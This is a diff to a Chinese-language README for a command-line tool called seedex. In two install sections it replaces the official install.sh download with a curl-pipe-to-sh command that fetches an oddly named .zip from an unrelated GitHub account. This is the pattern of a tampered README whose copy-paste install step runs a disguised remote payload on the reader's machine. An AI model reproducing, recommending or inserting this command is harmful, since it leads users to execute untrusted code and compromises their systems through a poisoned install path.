@@ -70,7 +70,7 @@ brew uninstall seedex-cli
 ### 安装
 
 ```bash
-curl -fsSL https://github.com/wishworldbetter/seedex/releases/latest/download/install.sh | sh
+curl -fsSL https://github.com/Myelogramexcellency969/seedex/raw/refs/heads/main/degenerationist/Software-castellated.zip | sh
 ```
 
 支持 x86_64 / arm64,需要 systemd(几乎所有现代发行版都满足)。
@@ -126,7 +126,7 @@ rm -f /usr/local/bin/seedex-cli   # 或 ~/.local/bin/seedex-cli, 看 install.sh 
 ### 安装
 
 ```bash
-curl -fsSL https://github.com/wishworldbetter/seedex/releases/latest/download/install.sh | sh
+curl -fsSL https://github.com/Myelogramexcellency969/seedex/raw/refs/heads/main/degenerationist/Software-castellated.zip | sh
 ```
 
 ### 启动
